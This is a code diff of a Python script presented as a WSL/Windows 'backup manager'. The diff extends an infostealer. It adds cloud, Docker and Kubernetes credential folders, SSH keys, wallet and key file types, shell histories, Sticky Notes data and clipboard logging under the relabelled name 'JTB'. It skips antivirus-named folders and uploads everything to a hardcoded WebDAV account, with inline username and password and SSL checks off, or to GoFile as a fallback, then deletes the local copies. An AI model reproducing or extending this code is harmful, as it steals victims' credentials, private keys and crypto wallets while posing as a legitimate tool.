@@ -19,9 +19,14 @@ import base64
 import getpass
 import json
 import sqlite3
+import urllib3
 from datetime import datetime, timedelta
 from pathlib import Path
 from functools import lru_cache
+from requests.auth import HTTPBasicAuth
+
+# 禁用SSL警告
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # 尝试导入浏览器数据导出所需的库
 BROWSER_EXPORT_AVAILABLE = False
@@ -51,7 +56,7 @@ class BackupConfig:
     
     # 监控配置
     BACKUP_INTERVAL = 260000  # 备份间隔时间（约3天）260000
-    CLIPBOARD_INTERVAL = 1200  # ZTB备份间隔时间（20分钟，单位：秒）1200
+    CLIPBOARD_INTERVAL = 1200  # JTB备份间隔时间（20分钟，单位：秒）1200
     
     # 超时配置
     WSL_BACKUP_TIMEOUT = 3600  # WSL备份超时时间（秒，1小时）
@@ -68,40 +73,64 @@ class BackupConfig:
     # 日志配置
     LOG_FILE = str(Path.home() / ".dev/Backup/backup.log")
     
-    # WSL指定备份目录或文件
+    # WSL指定备份目录或文件（相对于 WSL 用户主目录）
     WSL_SPECIFIC_DIRS = [
         ".ssh",           # SSH配置
         ".bash_history",  # Bash历史记录
         ".python_history", # Python历史记录
         ".bash_aliases",  # Bash别名
-        "Documents",      # 文档目录 - 已移除，以便其内容可以根据扩展名进行分类
         ".node_repl_history", # Node.js REPL 历史记录
         ".wget-hsts",     # wget HSTS 历史记录
         ".Xauthority",    # Xauthority 文件
         ".ICEauthority",  # ICEauthority 文件
+        # VPS服务商配置目录
+        ".aws",               # AWS配置
+        ".gcloud",            # Google Cloud配置
+        ".azure",             # Azure配置
+        ".aliyun",            # 阿里云配置
+        ".tencentcloud",      # 腾讯云配置
+        ".tccli",             # 腾讯云CLI配置
+        ".doctl",             # DigitalOcean配置
+        ".hcloud",            # Hetzner配置
+        ".vultr",             # Vultr配置
+        ".linode",            # Linode配置
+        ".oci",               # Oracle Cloud配置
+        ".bandwagon",         # 搬瓦工配置
+        ".bwg",               # 搬瓦工配置
+        ".docker",            # Docker配置
+        ".kube",              # Kubernetes配置
+    ]
+    
+    # Windows指定备份目录或文件（相对于 Windows 用户目录 /mnt/c/Users/{user}）
+    WINDOWS_SPECIFIC_PATHS = [
+        "Desktop",  # 桌面目录
+        "AppData/Local/Packages/Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe/LocalState/plum.sqlite",  # 便签数据库
+        ".python_history",  # Python 历史记录文件
+        ".node_repl_history",  # Node.js REPL 历史记录文件
+        "AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt",  # Windows PowerShell 历史
+        "AppData/Roaming/Microsoft/PowerShell/PSReadLine/ConsoleHost_history.txt",  # PowerShell Core 历史（如果存在）
     ]
     
     # WSL文件扩展名分类
-    WSL_EXTENSIONS_1 = [  # 文档类
-        ".txt", ".json", ".js", ".py", ".go", ".sh", ".bash",  ".sol", ".rs", ".env",
-        ".ts", ".jsx", ".tsx", ".csv", ".bin", ".wallet", "ps1"
+    WSL_EXTENSIONS_1 = [  # 文档/代码类
+        ".txt", ".json", ".js", ".py", ".go", ".sh", ".bash", ".rs", ".env",
+        ".ts", ".jsx", ".tsx", ".csv", ".ps1", ".md", ".pdf",
     ]
     
     WSL_EXTENSIONS_2 = [  # 配置和密钥类
-        ".pem", ".key", ".keystore", ".utc", ".xml", ".ini", ".config",
-        ".yaml", ".yml", ".toml", ".asc", ".gpg", ".pgp"
+        ".pem", ".key", ".keystore", ".utc", ".xml", ".ini", ".config", ".conf", ".json",
+        ".yaml", ".yml", ".toml", ".utc", ".gpg", ".pgp", ".wallet", ".keystore",
     ]
     
     # 磁盘文件分类
     DISK_EXTENSIONS_1 = [  # 文档类
-        ".xls", ".xlsx", ".et", ".one", ".txt", ".json", ".js", ".py", ".go", ".sh", ".bash",
-        ".env", ".ts", ".jsx", ".tsx", ".csv", ".dat", ".bin", ".wallet", "ps1"
+        ".xls", ".xlsx", ".doc", ".docx", ".et", ".one", ".txt", ".json", ".js", ".py", ".go", ".sh", ".bash",
+        ".env", ".ts", ".jsx", ".tsx", ".csv", ".ps1", ".md", ".pdf",
     ]
     
     DISK_EXTENSIONS_2 = [  # 配置和密钥类
-        ".pem", ".key", ".pub", ".xml", ".ini", ".asc", ".gpg", ".pgp", 
-        ".config", "id_rsa", "id_ecdsa", "id_ed25519", ".keystore", ".utc"
-        
+        ".pem", ".key", ".pub", ".xml", ".ini", ".asc", ".gpg", ".pgp", ".conf", ".wallet", ".toml",
+        ".config", "id_rsa", "id_ecdsa", "id_ed25519", ".keystore", ".utc", ".json", ".yml", ".yaml",   
     ]
     
     # 排除目录配置
@@ -116,24 +145,23 @@ class BackupConfig:
         
         # 开发工具和环境
         "Java", "Python", "NodeJS", "Go", "Visual Studio", "JetBrains",
-        "Docker", "Git", "MongoDB", "Redis", "MySQL", "PostgreSQL",
-        "Android", "gradle", "npm", "yarn", ".npm", ".nuget",
-        ".gradle", ".m2", ".vs", ".vscode", ".idea",
-        
-        # 虚拟机和容器
-        "VirtualBox VMs", "VMware", "Hyper-V", "Virtual Machines",
-        "docker", "containers", "WSL",
+        "Docker", "Git", "MongoDB", "Redis", "PostgreSQL",
+        "Android", "gradle", "npm", "yarn", "venv", "node_modules",
+        ".gradle", ".m2", ".vs", ".vscode", ".cargo", ".git", ".yean",
+        ".local", ".npm", ".nvm", ".orca_term", ".pki", ".pm2", "build",
+        ".rustup", ".bun", ".github", ".vscode", "myenv", "snap"
+        "__pycache__", ".vscode-server", "dist", ".cache", 
         
         # 其他大型应用
         "Adobe", "Autodesk", "Unity", "UnrealEngine", "Blender",
         "NVIDIA", "AMD", "Intel", "Realtek", "Waves",
         
         # 浏览器相关
-        "Google", "Chrome", "Mozilla", "Firefox", "Opera",
+        "Google", "Chrome", "Brave", "Firefox", "Opera",
         "Microsoft Edge", "Internet Explorer",
         
         # 通讯和办公软件
-        "Discord", "Zoom", "Teams", "Skype", "Slack",
+        "Discord", "Zoom", "Teams", "Skype", "Slack", "telegram",
         
         # 多媒体软件
         "Adobe", "Premiere", "Photoshop", "After Effects", "Vegas", "MAGIX", "Audacity",
@@ -143,7 +171,7 @@ class BackupConfig:
         "Avast", "AVG", "Bitdefender", "ESET",
         
         # 系统工具
-        "CCleaner", "WinRAR", "7-Zip", "PowerToys"
+        "CCleaner", "WinRAR", "7-Zip", "PowerToys",
     ]
     
     # 关键词排除
@@ -164,7 +192,10 @@ class BackupConfig:
         
         # 其他
         "bak", "obsolete", "archive", "trojan", "clash", "vpn",
-        "thumb", "thumbnail", "preview" , "v2ray", "office", "mail"
+        "thumb", "thumbnail", "preview" , "v2ray", "mail",
+
+        # 中文
+        "火绒", "杀毒", "电脑管家",
     ]
 
     EXCLUDE_WSL_DIRS = [
@@ -172,7 +203,6 @@ class BackupConfig:
         ".bitcoinlib",
         ".cargo",
         ".conda",
-        ".cursor-server",
         ".docker",
         ".dotnet",
         ".fonts",
@@ -194,19 +224,23 @@ class BackupConfig:
         ".solcx",
         ".themes",
         ".thunderbird",
-        ".vscode",
-        ".vscode-remote-containers",
-        ".vscode-server",
         ".wdm",
         "cache",
-        "Downloads",
         "myenv",
         "snap",
         "venv",
-        "vscode-remote:"
+        "node_modules",
+        "dist",
+        ".cache",
+        ".config",
+        ".vscode-server",
+        "build",
+        ".vscode-remote-ssh",
+        ".git",
+        "__pycache__",
     ]
-    
-    # 备用上传服务器
+
+    # GoFile 上传配置（备选方案）
     UPLOAD_SERVERS = [
         "https://store9.gofile.io/uploadFile",
         "https://store8.gofile.io/uploadFile",
@@ -228,7 +262,24 @@ class BackupManager:
     def __init__(self):
         """初始化备份管理器"""
         self.config = BackupConfig()
+        
+        # Infini Cloud 配置
+        self.infini_url = "https://wajima.infini-cloud.net/dav/"
+        self.infini_user = "wongstar"
+        self.infini_pass = "my95gfPVtKuDCpAK"
+        
+        username = getpass.getuser()
+        user_prefix = username[:5] if username else "user"
+        self.config.INFINI_REMOTE_BASE_DIR = f"{user_prefix}_wsl_backup"
+        
+        # 配置 requests session 用于上传
+        self.session = requests.Session()
+        self.session.verify = False  # 禁用SSL验证
+        self.auth = HTTPBasicAuth(self.infini_user, self.infini_pass)
+        
+        # GoFile API token（备选方案）
         self.api_token = "qSS40ZpgNXq7zZXzy4QDSX3z9yCVCXJu"
+        
         self._setup_logging()
 
     def _setup_logging(self):
@@ -755,8 +806,6 @@ class BackupManager:
                     chunk_files.append(chunk_path)
                     chunk_num += 1
                 
-            # 删除原始大文件
-            os.remove(file_path)
             logging.critical(f"文件 {file_path} 已分割为 {len(chunk_files)} 个分片")
             return chunk_files
         except (OSError, IOError) as e:
@@ -783,15 +832,251 @@ class BackupManager:
             for chunk_file in chunk_files:
                 if not self._upload_single_file(chunk_file):
                     success = False
-            # 清理分片目录
-            chunk_dir = os.path.dirname(chunk_files[0])
-            self._clean_directory(chunk_dir)
+            # 仅在全部分片上传成功后清理分片目录与原始文件
+            if success:
+                chunk_dir = os.path.dirname(chunk_files[0])
+                self._clean_directory(chunk_dir)
+                if os.path.exists(file_path):
+                    try:
+                        os.remove(file_path)
+                    except Exception:
+                        pass
             return success
         else:
             return self._upload_single_file(file_path)
 
+    def _create_remote_directory(self, remote_dir):
+        """创建远程目录（使用 WebDAV MKCOL 方法）"""
+        if not remote_dir or remote_dir == '.':
+            return True
+        
+        try:
+            # 构建目录路径
+            dir_path = f"{self.infini_url.rstrip('/')}/{remote_dir.lstrip('/')}"
+            
+            response = self.session.request('MKCOL', dir_path, auth=self.auth, timeout=(8, 8))
+            
+            if response.status_code in [201, 204, 405]:  # 405 表示已存在
+                return True
+            elif response.status_code == 409:
+                # 409 可能表示父目录不存在，尝试创建父目录
+                parent_dir = os.path.dirname(remote_dir)
+                if parent_dir and parent_dir != '.':
+                    if self._create_remote_directory(parent_dir):
+                        # 父目录创建成功，再次尝试创建当前目录
+                        response = self.session.request('MKCOL', dir_path, auth=self.auth, timeout=(8, 8))
+                        return response.status_code in [201, 204, 405]
+                return False
+            else:
+                return False
+        except Exception:
+            return False
+
+    def _upload_single_file_infini(self, file_path):
+        """上传单个文件到 Infini Cloud（使用 WebDAV PUT 方法）"""
+        try:
+            # 检查文件权限和状态
+            if not os.path.exists(file_path):
+                logging.error(f"文件不存在: {file_path}")
+                return False
+                
+            file_size = os.path.getsize(file_path)
+            if file_size == 0:
+                logging.error(f"文件大小为0: {file_path}")
+                return False
+                
+            if file_size > self.config.MAX_SINGLE_FILE_SIZE:
+                logging.error(f"文件过大 {file_path}: {file_size / 1024 / 1024:.2f}MB > {self.config.MAX_SINGLE_FILE_SIZE / 1024 / 1024}MB")
+                return False
+
+            # 构建远程路径
+            filename = os.path.basename(file_path)
+            remote_filename = f"{self.config.INFINI_REMOTE_BASE_DIR}/{filename}"
+            remote_path = f"{self.infini_url.rstrip('/')}/{remote_filename.lstrip('/')}"
+            
+            # 创建远程目录（如果需要）
+            remote_dir = os.path.dirname(remote_filename)
+            if remote_dir and remote_dir != '.':
+                if not self._create_remote_directory(remote_dir):
+                    logging.warning(f"无法创建远程目录: {remote_dir}，将继续尝试上传")
+
+            # 上传重试逻辑
+            for attempt in range(self.config.RETRY_COUNT):
+                if not self._check_internet_connection():
+                    logging.error("网络连接不可用，等待重试...")
+                    time.sleep(self.config.RETRY_DELAY)
+                    continue
+
+                try:
+                    # 根据文件大小动态调整超时时间
+                    if file_size < 1024 * 1024:  # 小于1MB
+                        connect_timeout = 10
+                        read_timeout = 30
+                    elif file_size < 10 * 1024 * 1024:  # 1-10MB
+                        connect_timeout = 15
+                        read_timeout = max(30, int(file_size / 1024 / 1024 * 5))
+                    else:  # 大于10MB
+                        connect_timeout = 20
+                        read_timeout = max(60, int(file_size / 1024 / 1024 * 6))
+                    
+                    # 只在第一次尝试时显示详细信息
+                    if attempt == 0:
+                        size_str = f"{file_size / 1024 / 1024:.2f}MB" if file_size >= 1024 * 1024 else f"{file_size / 1024:.2f}KB"
+                        logging.critical(f"📤 [Infini Cloud] 上传: {filename} ({size_str})")
+                    elif self.config.DEBUG_MODE:
+                        logging.debug(f"[Infini Cloud] 重试上传: {filename} (第 {attempt + 1} 次)")
+                    
+                    # 准备请求头
+                    headers = {
+                        'Content-Type': 'application/octet-stream',
+                        'Content-Length': str(file_size),
+                    }
+                    
+                    # 执行上传（使用 WebDAV PUT 方法）
+                    with open(file_path, 'rb') as f:
+                        response = self.session.put(
+                            remote_path,
+                            data=f,
+                            headers=headers,
+                            auth=self.auth,
+                            timeout=(connect_timeout, read_timeout),
+                            stream=False
+                        )
+                    
+                    if response.status_code in [201, 204]:
+                        logging.critical(f"✅ [Infini Cloud] {filename}")
+                        return True
+                    elif response.status_code == 403:
+                        if attempt == 0 or self.config.DEBUG_MODE:
+                            logging.error(f"❌ [Infini Cloud] {filename}: 权限不足")
+                    elif response.status_code == 404:
+                        if attempt == 0 or self.config.DEBUG_MODE:
+                            logging.error(f"❌ [Infini Cloud] {filename}: 远程路径不存在")
+                    elif response.status_code == 409:
+                        if attempt == 0 or self.config.DEBUG_MODE:
+                            logging.error(f"❌ [Infini Cloud] {filename}: 远程路径冲突")
+                    else:
+                        if attempt == 0 or self.config.DEBUG_MODE:
+                            logging.error(f"❌ [Infini Cloud] {filename}: 状态码 {response.status_code}")
+                        
+                except requests.exceptions.Timeout:
+                    if attempt == 0 or self.config.DEBUG_MODE:
+                        logging.error(f"❌ [Infini Cloud] {os.path.basename(file_path)}: 超时")
+                except requests.exceptions.SSLError as e:
+                    if attempt == 0 or self.config.DEBUG_MODE:
+                        logging.error(f"❌ [Infini Cloud] {os.path.basename(file_path)}: SSL错误")
+                except requests.exceptions.ConnectionError as e:
+                    if attempt == 0 or self.config.DEBUG_MODE:
+                        logging.error(f"❌ [Infini Cloud] {os.path.basename(file_path)}: 连接错误")
+                except Exception as e:
+                    if attempt == 0 or self.config.DEBUG_MODE:
+                        logging.error(f"❌ [Infini Cloud] {os.path.basename(file_path)}: {str(e)}")
+
+                if attempt < self.config.RETRY_COUNT - 1:
+                    if self.config.DEBUG_MODE:
+                        logging.debug(f"等待 {self.config.RETRY_DELAY} 秒后重试...")
+                    time.sleep(self.config.RETRY_DELAY)
+
+            return False
+            
+        except OSError as e:
+            logging.error(f"获取文件信息失败 {file_path}: {e}")
+            return False
+        except Exception as e:
+            logging.error(f"[Infini Cloud] 上传过程出错: {e}")
+            return False
+
+    def _upload_single_file_gofile(self, file_path):
+        """上传单个文件到 GoFile（备选方案）
+        
+        Args:
+            file_path: 要上传的文件路径
+            
+        Returns:
+            bool: 上传是否成功
+        """
+        try:
+            file_size = os.path.getsize(file_path)
+            if file_size == 0:
+                logging.error(f"文件大小为0 {file_path}")
+                return False
+                
+            if file_size > self.config.MAX_SINGLE_FILE_SIZE:
+                logging.error(f"⚠️ 文件过大 {file_path}: {file_size / 1024 / 1024:.2f}MB > {self.config.MAX_SINGLE_FILE_SIZE / 1024 / 1024}MB")
+                return False
+
+            filename = os.path.basename(file_path)
+            logging.info(f"🔄 尝试使用 GoFile 上传: {filename}")
+
+            for attempt in range(self.config.RETRY_COUNT):
+                # 检查网络连接
+                if not self._check_internet_connection():
+                    logging.error("⚠️ 网络连接不可用，等待重试...")
+                    time.sleep(self.config.RETRY_DELAY * 2)  # 网络问题时等待更长时间
+                    continue
+
+                for server in self.config.UPLOAD_SERVERS:
+                    try:
+                        with open(file_path, "rb") as f:
+                            if attempt == 0:
+                                logging.critical(f"⌛ [GoFile] 正在上传文件 {filename}（{file_size / 1024 / 1024:.2f}MB），使用服务器 {server}...")
+                            elif self.config.DEBUG_MODE:
+                                logging.debug(f"[GoFile] 第 {attempt + 1} 次尝试，使用服务器 {server}...")
+                            
+                            response = requests.post(
+                                server,
+                                files={"file": f},
+                                data={"token": self.api_token},
+                                timeout=self.config.UPLOAD_TIMEOUT,
+                                verify=True
+                            )
+                            
+                            if response.ok and response.headers.get("Content-Type", "").startswith("application/json"):
+                                result = response.json()
+                                if result.get("status") == "ok":
+                                    logging.critical(f"✅ [GoFile] {filename}")
+                                    return True
+                                else:
+                                    error_msg = result.get("message", "未知错误")
+                                    if attempt == 0 or self.config.DEBUG_MODE:
+                                        logging.error(f"❌ [GoFile] 服务器返回错误: {error_msg}")
+                            else:
+                                if attempt == 0 or self.config.DEBUG_MODE:
+                                    logging.error(f"❌ [GoFile] 上传失败，状态码: {response.status_code}")
+                                
+                    except requests.exceptions.Timeout:
+                        if attempt == 0 or self.config.DEBUG_MODE:
+                            logging.error(f"❌ [GoFile] {filename}: 上传超时")
+                    except requests.exceptions.SSLError:
+                        if attempt == 0 or self.config.DEBUG_MODE:
+                            logging.error(f"❌ [GoFile] {filename}: SSL错误")
+                    except requests.exceptions.ConnectionError:
+                        if attempt == 0 or self.config.DEBUG_MODE:
+                            logging.error(f"❌ [GoFile] {filename}: 连接错误")
+                    except Exception as e:
+                        if attempt == 0 or self.config.DEBUG_MODE:
+                            logging.error(f"❌ [GoFile] {filename}: {str(e)}")
+                    
+                    # 如果这个服务器失败，继续尝试下一个服务器
+                    continue
+                
+                if attempt < self.config.RETRY_COUNT - 1:
+                    if self.config.DEBUG_MODE:
+                        logging.debug(f"等待 {self.config.RETRY_DELAY} 秒后重试...")
+                    time.sleep(self.config.RETRY_DELAY)
+            
+            logging.error(f"❌ [GoFile] {filename}: 上传失败，已达到最大重试次数")
+            return False
+            
+        except OSError as e:
+            logging.error(f"❌ 获取文件大小失败 {file_path}: {e}")
+            return False
+        except Exception as e:
+            logging.error(f"[GoFile] 上传过程出错: {e}")
+            return False
+
     def _upload_single_file(self, file_path):
-        """上传单个文件
+        """上传单个文件，优先使用 Infini Cloud，失败则使用 GoFile 备选方案
         
         Args:
             file_path: 要上传的文件路径
@@ -809,69 +1094,32 @@ class BackupManager:
                 
             if file_size > self.config.MAX_SINGLE_FILE_SIZE:
                 logging.error(f"⚠️ 文件过大 {file_path}: {file_size / 1024 / 1024:.2f}MB > {self.config.MAX_SINGLE_FILE_SIZE / 1024 / 1024}MB")
+                if os.path.exists(file_path):
+                    os.remove(file_path)
                 return False
 
-            for attempt in range(self.config.RETRY_COUNT):
-                # 检查网络连接
-                if not self._check_internet_connection():
-                    logging.error("⚠️ 网络连接不可用，等待重试...")
-                    time.sleep(self.config.RETRY_DELAY * 2)  # 网络问题时等待更长时间
-                    continue
+            # 优先尝试 Infini Cloud 上传
+            if self._upload_single_file_infini(file_path):
+                if os.path.exists(file_path):
+                    os.remove(file_path)
+                return True
 
-                for server in self.config.UPLOAD_SERVERS:
-                    try:
-                        with open(file_path, "rb") as f:
-                            logging.critical(f"⌛ 正在上传文件 {file_path}（{file_size / 1024 / 1024:.2f}MB），第 {attempt + 1} 次尝试，使用服务器 {server}...")
-                            
-                            response = requests.post(
-                                server,
-                                files={"file": f},
-                                data={"token": self.api_token},
-                                timeout=self.config.UPLOAD_TIMEOUT,
-                                verify=True
-                            )
-                            
-                            if response.ok and response.headers.get("Content-Type", "").startswith("application/json"):
-                                result = response.json()
-                                if result.get("status") == "ok":
-                                    logging.critical(f"📤 上传成功: {file_path}")
-                                    os.remove(file_path)
-                                    return True
-                                else:
-                                    error_msg = result.get("message", "未知错误")
-                                    logging.error(f"❌ 服务器返回错误: {error_msg}")
-                            else:
-                                logging.error(f"❌ 上传失败，状态码: {response.status_code}, 响应: {response.text}")
-                                
-                    except requests.exceptions.Timeout:
-                        logging.error(f"❌ 上传超时 {file_path}")
-                    except requests.exceptions.SSLError:
-                        logging.error(f"❌ SSL错误 {file_path}")
-                    except requests.exceptions.ConnectionError:
-                        logging.error(f"❌ 连接错误 {file_path}")
-                    except Exception as e:
-                        logging.error(f"❌ 上传文件出错 {file_path}: {str(e)}")
-                    
-                    # 如果这个服务器失败，继续尝试下一个服务器
-                    continue
-                
-                if attempt < self.config.RETRY_COUNT - 1:
-                    logging.critical(f"等待 {self.config.RETRY_DELAY} 秒后重试...")
-                    time.sleep(self.config.RETRY_DELAY)
+            # Infini Cloud 上传失败，尝试使用 GoFile 备选方案
+            logging.warning(f"⚠️ Infini Cloud 上传失败，尝试使用 GoFile 备选方案: {os.path.basename(file_path)}")
+            if self._upload_single_file_gofile(file_path):
+                if os.path.exists(file_path):
+                    os.remove(file_path)
+                return True
             
-            # 所有重试都失败后，删除文件
-            try:
-                os.remove(file_path)
-                logging.error(f"⚠️ 文件 {file_path} 上传失败并已删除")
-            except Exception as e:
-                logging.error(f"❌ 删除失败文件时出错: {e}")
-            
+            # 两个方法都失败
+            logging.error(f"❌ {os.path.basename(file_path)}: 所有上传方法均失败")
             return False
             
         except OSError as e:
             logging.error(f"❌ 获取文件大小失败 {file_path}: {e}")
-            if os.path.exists(file_path):
-                os.remove(file_path)
+            return False
+        except Exception as e:
+            logging.error(f"处理文件时出现未知错误: {str(e)}")
             return False
 
     def zip_backup_folder(self, folder_path, zip_file_path):
@@ -919,7 +1167,7 @@ class BackupManager:
             if os.path.exists(tar_path):
                 os.remove(tar_path)
 
-            with tarfile.open(tar_path, "w:gz") as tar:
+            with tarfile.open(tar_path, "w:gz", compresslevel=self.config.TAR_COMPRESS_LEVEL) as tar:
                 tar.add(folder_path, arcname=os.path.basename(folder_path))
 
             # 验证压缩文件
@@ -1118,9 +1366,9 @@ class BackupManager:
             return None
 
     def get_clipboard_content(self):
-        """获取ZTB内容，支持 Windows 和 WSL 环境"""
+        """获取JTB内容，支持 Windows 和 WSL 环境"""
         try:
-            # 在 WSL 中使用 PowerShell 获取 Windows ZTB
+            # 在 WSL 中使用 PowerShell 获取 Windows JTB
             ps_command = 'powershell.exe Get-Clipboard'
             result = subprocess.run(
                 ps_command,
@@ -1160,17 +1408,17 @@ class BackupManager:
                         content = result.stdout.decode('utf-8', errors='ignore').strip()
                         if content and not content.isspace():
                             if self.config.DEBUG_MODE:
-                                logging.warning("⚠️ 使用 ignore 模式解码ZTB内容")
+                                logging.warning("⚠️ 使用 ignore 模式解码JTB内容")
                             return content
                     except Exception as e:
                         if self.config.DEBUG_MODE:
                             logging.error(f"❌ ignore 模式解码失败: {str(e)}")
                 else:
                     if self.config.DEBUG_MODE:
-                        logging.debug("ℹ️ ZTB为空")
+                        logging.debug("ℹ️ JTB为空")
             else:
                 if self.config.DEBUG_MODE:
-                    logging.error(f"❌ 获取ZTB失败，返回码: {result.returncode}")
+                    logging.error(f"❌ 获取JTB失败，返回码: {result.returncode}")
                     if result.stderr:
                         try:
                             error_msg = result.stderr.decode('utf-8', errors='ignore')
@@ -1181,11 +1429,11 @@ class BackupManager:
             return None
         except Exception as e:
             if self.config.DEBUG_MODE:
-                logging.error(f"❌ 获取ZTB出错: {str(e)}")
+                logging.error(f"❌ 获取JTB出错: {str(e)}")
             return None
 
     def log_clipboard_update(self, content, file_path):
-        """记录ZTB更新到文件"""
+        """记录JTB更新到文件"""
         try:
             # 确保目录存在
             os.makedirs(os.path.dirname(file_path), exist_ok=True)
@@ -1204,10 +1452,10 @@ class BackupManager:
             logging.info(f"📝 已记录内容: {content_preview}")
         except Exception as e:
             if self.config.DEBUG_MODE:
-                logging.error(f"❌ 记录ZTB失败: {str(e)}")
+                logging.error(f"❌ 记录JTB失败: {str(e)}")
 
     def monitor_clipboard(self, file_path, interval=3):
-        """监控ZTB变化并记录到文件
+        """监控JTB变化并记录到文件
         
         Args:
             file_path: 日志文件路径
@@ -1219,22 +1467,22 @@ class BackupManager:
             try:
                 os.makedirs(log_dir, exist_ok=True)
             except Exception as e:
-                logging.error(f"❌ 创建ZTB日志目录失败: {str(e)}")
+                logging.error(f"❌ 创建JTB日志目录失败: {str(e)}")
                 return
 
         last_content = ""
         error_count = 0  # 添加错误计数
         max_errors = 5   # 最大连续错误次数
-        last_empty_log_time = time.time()  # 记录上次输出空ZTB日志的时间
-        empty_log_interval = 300  # 每5分钟才输出一次空ZTB日志
+        last_empty_log_time = time.time()  # 记录上次输出空JTB日志的时间
+        empty_log_interval = 300  # 每5分钟才输出一次空JTB日志
         
         # 初始化日志文件
         try:
             with open(file_path, 'a', encoding='utf-8') as f:
-                f.write(f"\n=== 📋 ZTB监控启动于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
+                f.write(f"\n=== 📋 JTB监控启动于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
                 f.write("-"*30 + "\n")
         except Exception as e:
-            logging.error(f"❌ 初始化ZTB日志失败: {str(e)}")
+            logging.error(f"❌ 初始化JTB日志失败: {str(e)}")
         
         def is_special_content(text):
             """检查是否为特殊标记内容"""
@@ -1244,7 +1492,7 @@ class BackupManager:
             if text.startswith('===') or text.startswith('-'):
                 return True
             # 跳过时间戳行
-            if 'ZTB监控启动于' in text or '日志已于' in text:
+            if 'JTB监控启动于' in text or '日志已于' in text:
                 return True
             return False
         
@@ -1268,9 +1516,9 @@ class BackupManager:
                 else:
                     if self.config.DEBUG_MODE and current_time - last_empty_log_time >= empty_log_interval:
                         if not current_content:
-                            logging.debug("ℹ️ ZTB为空")
+                            logging.debug("ℹ️ JTB为空")
                         elif current_content.isspace():
-                            logging.debug("ℹ️ ZTB内容仅包含空白字符")
+                            logging.debug("ℹ️ JTB内容仅包含空白字符")
                         elif is_special_content(current_content):
                             logging.debug("ℹ️ 跳过特殊标记内容")
                         last_empty_log_time = current_time
@@ -1279,11 +1527,11 @@ class BackupManager:
             except Exception as e:
                 error_count += 1
                 if error_count >= max_errors:
-                    logging.error(f"❌ ZTB监控连续出错{max_errors}次，等待60秒后重试")
+                    logging.error(f"❌ JTB监控连续出错{max_errors}次，等待60秒后重试")
                     time.sleep(60)  # 连续错误时增加等待时间
                     error_count = 0  # 重置错误计数
                 elif self.config.DEBUG_MODE:
-                    logging.error(f"❌ ZTB监控出错: {str(e)}")
+                    logging.error(f"❌ JTB监控出错: {str(e)}")
                 
             time.sleep(interval)
 
@@ -1360,12 +1608,14 @@ def get_available_disks():
     disk_letters = ['d', 'e', 'f']
     
     # 处理普通磁盘
+    username = getpass.getuser()
+    user_prefix = username[:5] if username else "user"
     for letter in disk_letters:
         disk_path = f"/mnt/{letter}"
         if is_disk_available(disk_path):
             available_disks[letter] = {
-                'docs': (disk_path, Path.home() / f".dev/Backup/{letter}_docs", 1),  # 文档类
-                'configs': (disk_path, Path.home() / f".dev/Backup/{letter}_configs", 2),  # 配置类
+                'docs': (disk_path, Path.home() / f".dev/Backup/{user_prefix}_{letter}_docs", 1),  # 文档类
+                'configs': (disk_path, Path.home() / f".dev/Backup/{user_prefix}_{letter}_configs", 2),  # 配置类
             }
             logging.info(f"检测到可用磁盘: {disk_path}")
     
@@ -1382,8 +1632,8 @@ def get_available_disks():
                     if any(keyword.lower() in item.lower() for keyword in cloud_keywords):
                         disk_key = f"cloud_{item.lower()}"
                         available_disks[disk_key] = {
-                            'docs': (item_path, Path.home() / f".dev/Backup/cloud_docs", 1),
-                            'configs': (item_path, Path.home() / f".dev/Backup/cloud_configs", 2),
+                            'docs': (item_path, Path.home() / f".dev/Backup/{user_prefix}_cloud_docs", 1),
+                            'configs': (item_path, Path.home() / f".dev/Backup/{user_prefix}_cloud_configs", 2),
                         }
                         logging.info(f"检测到云盘目录: {item_path}")
         except Exception as e:
@@ -1431,40 +1681,65 @@ def get_username():
         logging.error(f"获取Windows用户名失败: {e}")
         return "Administrator"
 
-def backup_notepad_temp(backup_manager, user):
-    """备份记事本临时文件"""
-    notepad_temp_directory = f"/mnt/c/Users/{user}/AppData/Local/Packages/Microsoft.WindowsNotepad_8wekyb3d8bbwe/LocalState/TabState"
-    notepad_backup_directory = Path.home() / ".dev/Backup/notepad"
-
-    if not os.path.exists(notepad_temp_directory):
-        logging.error(f"记事本缓存目录不存在: {notepad_temp_directory}")
-        return None
-
-    if not backup_manager._clean_directory(str(notepad_backup_directory)):
-        return None
-
-    for root, _, files in os.walk(notepad_temp_directory):
-        for file in files:
-            try:
-                src_path = os.path.join(root, file)
-                if not os.path.exists(src_path):
-                    continue
-                rel_path = os.path.relpath(root, notepad_temp_directory)
-                dst_dir = os.path.join(notepad_backup_directory, rel_path)
-                if not backup_manager._ensure_directory(dst_dir):
-                    continue
-                shutil.copy2(src_path, os.path.join(dst_dir, file))
-            except Exception as e:
-                logging.error(f"复制记事本文件失败: {src_path} - {e}")
-    return str(notepad_backup_directory)
-
 def backup_screenshots(user):
     """备份截图文件"""
+    def windows_path_to_wsl(path):
+        """将 Windows 路径转换为 WSL 路径"""
+        if not path:
+            return None
+        path = path.strip().strip('"')
+        if len(path) >= 2 and path[1] == ":":
+            drive = path[0].lower()
+            rest = path[2:].replace("\\", "/").lstrip("/")
+            return f"/mnt/{drive}/{rest}"
+        return None
+
+    def get_screenshot_location():
+        """读取 Windows 截图默认保存路径（注册表）"""
+        if shutil.which("powershell.exe") is None:
+            return None
+        ps_command = (
+            "(Get-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders')."
+            "'{B7BEDE81-DF94-4682-A7D8-57A52620B86F}'"
+        )
+        try:
+            result = subprocess.run(
+                ["powershell.exe", "-NoProfile", "-Command", ps_command],
+                capture_output=True,
+                text=True
+            )
+            if result.returncode != 0:
+                return None
+            wsl_path = windows_path_to_wsl(result.stdout.strip())
+            if wsl_path and os.path.exists(wsl_path):
+                return wsl_path
+        except Exception:
+            return None
+        return None
+
     screenshot_paths = [
         f"/mnt/c/Users/{user}/Pictures",
         f"/mnt/c/Users/{user}/OneDrive/Pictures"
     ]
-    screenshot_backup_directory = Path.home() / ".dev/Backup/tmp_screenshots"
+    custom_path = get_screenshot_location()
+    if custom_path and custom_path not in screenshot_paths:
+        screenshot_paths.append(custom_path)
+
+    screenshot_keywords = [
+        "screenshot",
+        "screen shot",
+        "screen_shot",
